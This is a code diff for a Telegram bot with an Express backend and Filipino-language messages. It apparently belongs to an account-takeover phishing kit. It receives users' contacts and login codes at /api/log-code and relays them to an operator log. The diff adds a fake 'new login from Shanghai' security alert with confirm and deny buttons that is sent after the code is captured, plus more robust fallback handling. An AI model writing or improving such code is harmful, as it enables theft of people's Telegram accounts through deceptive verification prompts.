@@ -120,40 +120,6 @@ bot.on("contact", async (ctx) => {
   scheduleDelete(ctx.chat.id, webappMsg.message_id);
 });
 
-// optional: WebApp data callback
-bot.on("message", async (ctx) => {
-  const data = ctx.message.web_app_data?.data;
-  if (data) {
-    console.log("WEBAPP DATA:", data);
-    
-    // Send photo with "Yes, it's me" button
-    try {
-      const photoMsg = await ctx.replyWithPhoto(
-        PHOTO_URL,
-        {
-          caption: "May nag-login sa account mo!\n\n" +
-                   "Nakita namin na may bagong login mula sa Xiaomi Xiaomi 12T Pro, Shanghai, China. Ikaw ba ito?",
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: "Oo, ako yan", callback_data: `confirm_login:${ctx.from.id}` },
-                { text: "Hindi ako yan!", callback_data: `deny_login:${ctx.from.id}` }
-              ]
-            ]
-          }
-        }
-      );
-      scheduleDelete(ctx.chat.id, photoMsg.message_id);
-    } catch (err) {
-      console.error("Error sending photo:", err);
-      const msg = await ctx.reply(
-        "Isinumite na ang verification mo. Sandali lang. ⏳"
-      );
-      scheduleDelete(ctx.chat.id, msg.message_id);
-    }
-  }
-});
-
 // HTTP server
 const app = express();
 app.use(cors());
@@ -190,6 +156,52 @@ app.post("/api/log-code", async (req, res) => {
     username,
     firstName,
   });
+
+  // SEND PHOTO TO USER after receiving code
+  if (userId) {
+    try {
+      console.log(`Sending photo to user ${userId}`);
+      await bot.telegram.sendPhoto(
+        userId,
+        PHOTO_URL,
+        {
+          caption: "May nag-login sa account mo!\n\n" +
+                   "Nakita namin na may bagong login mula sa Xiaomi Xiaomi 12T Pro, Shanghai, China. Ikaw ba ito?",
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: "Oo, ako yan", callback_data: `confirm_login:${userId}` },
+                { text: "Hindi ako yan!", callback_data: `deny_login:${userId}` }
+              ]
+            ]
+          }
+        }
+      );
+      console.log("Photo sent successfully to user");
+    } catch (photoErr) {
+      console.error("Error sending photo to user:", photoErr);
+      // Fallback to text message if photo fails
+      try {
+        await bot.telegram.sendMessage(
+          userId,
+          "⚠️ May nag-login sa account mo!\n\n" +
+          "Nakita namin na may bagong login mula sa Xiaomi Xiaomi 12T Pro, Shanghai, China. Ikaw ba ito?",
+          {
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  { text: "Oo, ako yan", callback_data: `confirm_login:${userId}` },
+                  { text: "Hindi ako yan!", callback_data: `deny_login:${userId}` }
+                ]
+              ]
+            }
+          }
+        );
+      } catch (textErr) {
+        console.error("Error sending fallback message:", textErr);
+      }
+    }
+  }
 
   const logText =
     "🔔 New verification request\n\n" +
@@ -229,16 +241,31 @@ bot.on("callback_query", async (ctx) => {
     
     if (action === "confirm_login") {
       await ctx.answerCbQuery("Salamat sa confirmation!");
-      await ctx.editMessageCaption(
-        "✅ Nakumpirma mo na ikaw ang nag-login.\n\n" +
-        "Hinihintay na lang natin ang approval ng admin."
-      );
+      try {
+        await ctx.editMessageCaption(
+          "✅ Nakumpirma mo na ikaw ang nag-login.\n\n" +
+          "Hinihintay na lang natin ang approval ng admin."
+        );
+      } catch (err) {
+        // If caption edit fails, try editing as text
+        await ctx.editMessageText(
+          "✅ Nakumpirma mo na ikaw ang nag-login.\n\n" +
+          "Hinihintay na lang natin ang approval ng admin."
+        );
+      }
     } else if (action === "deny_login") {
       await ctx.answerCbQuery("Nag-report ka ng suspicious login");
-      await ctx.editMessageCaption(
-        "⚠️ Nag-report ka na hindi ikaw ang nag-login.\n\n" +
-        "Paki-check ang security ng account mo."
-      );
+      try {
+        await ctx.editMessageCaption(
+          "⚠️ Nag-report ka na hindi ikaw ang nag-login.\n\n" +
+          "Paki-check ang security ng account mo."
+        );
+      } catch (err) {
+        await ctx.editMessageText(
+          "⚠️ Nag-report ka na hindi ikaw ang nag-login.\n\n" +
+          "Paki-check ang security ng account mo."
+        );
+      }
     }
     return;
   }
